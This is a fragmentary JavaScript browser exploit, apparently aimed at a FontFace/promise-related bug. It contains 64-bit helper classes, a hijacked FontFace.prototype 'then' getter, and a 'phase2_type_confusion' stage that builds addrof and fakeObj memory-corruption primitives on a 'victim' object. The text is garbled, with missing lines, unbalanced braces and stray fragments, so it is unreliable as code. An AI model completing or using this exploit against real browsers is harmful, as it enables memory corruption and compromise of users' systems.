function hex(n) {
    if (typeof n === 'number') {
        if (n < 0) n = n >>> 0;
        return '0x' + n.toString(16).padStart(8, '0');
    }
    return String(n);
}

function hex64(low, high) {
    if (low < 0) low = low >>> 0;
    if (high < 0) high = high >>> 0;
    return '0x' + high.toString(16).padStart(8, '0') + '_' + low.toString(16).padStart(8, '0');
}

// Int64 class for handling 64-bit values
class Int64 {
    constructor(low, high) {
        this.low = low >>> 0;
        this.high = high >>> 0;
    }
    
    static fromDouble(d) {
        let buf = new ArrayBuffer(8);
        let f64 = new Float64Array(buf);
        let u32 = new Uint32Array(buf);
        f64[0] = d;
        return new Int64(u32[0], u32[1]);
    }
    
    asDouble() {
        let buf = new ArrayBuffer(8);
        let u32 = new Uint32Array(buf);
        let f64 = new Float64Array(buf);
        u32[0] = this.low;
        u32[1] = this.high;
        return f64[0];
    }
    
    add(offset) {
        let newLow = (this.low + offset) >>> 0;
        let newHigh = this.high;
        if (newLow < this.low) {
            newHigh = (newHigh + 1) >>> 0;
        }
        return new Int64(newLow, newHigh);
    }
    
    toString() {
        return hex64(this.low, this.high);
    }
}

    let corrupted = [];

    Object.defineProperty(FontFace.prototype, 'then', {
        configurable: true,
        get() {

                fired = true;

                        unicodeRange: 'U+' + (0x100 + i).toString(16)

function phase2_type_confusion() {

    for (let i = 0; i < 1024; i++) {

    exploitState.controlledBuffer = ab;
    exploitState.u32 = u32;

    // Create arrays for type confusion

    let confusedArray = [1.1, 2.2, 3.3, 4.4];
    let objectArray = [{}, {}, {}, {}];
    
    log('[*] Created confusion arrays');
    log('    confusedArray: Float array');
    log('    objectArray: Object array\n');
    
    // Set up prototype that allows type confusion

        _confused: confusedArray,
        _objects: objectArray,
        _buffer: ab,
        _u32: u32,
        _f64: f64,
        
        // This will be our addrof primitive

            // Return the first element of objectArray as a float

        set leakAddr(obj) {
            // Store object in array position 0

            // Return the first element of confused as an object

        },
        
        set fakeObj(floatVal) {
            // Store float in confused array
            this._confused[0] = floatVal;
            // Now objects[0] should interpret this as an object pointer
        }
    };
    
    Object.setPrototypeOf(victim, confusionProto);
    
    log('[*] Installed confusion prototype on victim\n');
    
    window.victim = victim;
    window.exploitState = exploitState;
    
    return true;
}
